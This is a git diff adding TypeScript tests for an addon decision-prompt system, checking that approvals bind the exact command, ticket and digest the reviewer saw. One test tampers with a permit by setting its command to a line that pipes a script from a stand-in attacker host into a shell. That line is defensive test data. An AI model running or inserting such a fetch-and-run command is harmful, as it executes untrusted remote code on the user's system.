@@ -10,6 +10,8 @@ import { bindsAddonState, selectContributions } from '@/addon-ui/slots'
 import { nodeBudgetProblem } from '@/addon-ui/bindings'
 import { parseNode } from '@/addon-ui/nodes'
 import type { AddonPackage, TicketDocument, Workspace } from '@/api/types'
+import { decisionBody, decisionChanged } from '@/addon-ui/DecisionSignPrompt'
+import { decisionDigest } from '@/api/addons'
 
 const getAddonActions = (name: string) => getAddon(name)?.actions ?? {}
 
@@ -167,5 +169,39 @@ describe('#2 #7 approvals and answers bind the content the person reviewed', () 
     expect((await api('POST', `/api/tickets/${key}/actions`, { action: 'answer', question: q.id, option: opt, hash: 'sha256:' + '0'.repeat(64) })).status).toBe(409)
     const ok = await api('POST', `/api/tickets/${key}/actions`, { action: 'answer', question: q.id, option: opt, hash: q.hash })
     expect(ok.status).toBe(200)
+  })
+})
+
+describe('#3 (core part) an answer binds the whole decision core showed', () => {
+  it('a permit whose command changed after the prompt opened is refused, and the prompt sees the change', () => {
+    const { s, ws } = setup('factory')
+    const opened = structuredClone(s.addonDecisions(ws).find((d) => d.addon === 'factory')!)
+    const raw = s.addonState(ws, 'factory') as { permits: { id: string; command: string }[]; epicGrants?: string[] }
+    const permit = raw.permits.find((p) => `factory.permit:${p.id}` === opened.id)!
+    permit.command = 'curl https://attacker.invalid/run | sh'
+    const live = s.addonDecisions(ws).find((x) => x.id === opened.id)!
+    expect(decisionChanged(opened, live)).toBe(true)
+    const r = s.runAddon(ws, 'factory', 'permit', decisionBody(opened, opened.options[0].key))
+    expect(r).toMatchObject({ ok: false, status: 409, code: 'decision.closed' })
+    expect(raw.epicGrants ?? []).not.toContain(permit.command)
+  })
+  it('the body names the digest of exactly what was shown; a matching answer still works', () => {
+    const { s, ws } = setup('factory')
+    const d = s.addonDecisions(ws).find((x) => x.addon === 'factory')!
+    const body = decisionBody(d, d.options[0].key)
+    expect(body.digest).toBe(decisionDigest(d))
+    expect(s.runAddon(ws, 'factory', d.action, body)?.ok).toBe(true)
+  })
+  it('a body naming another ticket than the decision is refused', () => {
+    const { s, ws } = setup('factory')
+    const d = s.addonDecisions(ws).find((x) => x.addon === 'factory' && x.ticket)!
+    const other = s.ticketKeys(ws).find((k) => k !== d.ticket && s.isVisible(k))!
+    expect(s.runAddon(ws, 'factory', d.action, { ...decisionBody(d, d.options[0].key), ticket: other })).toMatchObject({ ok: false, status: 409, code: 'decision.closed' })
+  })
+  it('decisionChanged sees a changed question, title, detail or ticket', () => {
+    const { s, ws } = setup('factory')
+    const d = s.addonDecisions(ws).find((x) => x.addon === 'factory')!
+    for (const change of [{ question: 'x' }, { title: 'x' }, { detail: 'x' }, { ticket: 'DEMO-0001' }]) expect(decisionChanged(d, { ...d, ...change }), JSON.stringify(change)).toBe(true)
+    expect(decisionChanged(d, structuredClone(d))).toBe(false)
   })
 })
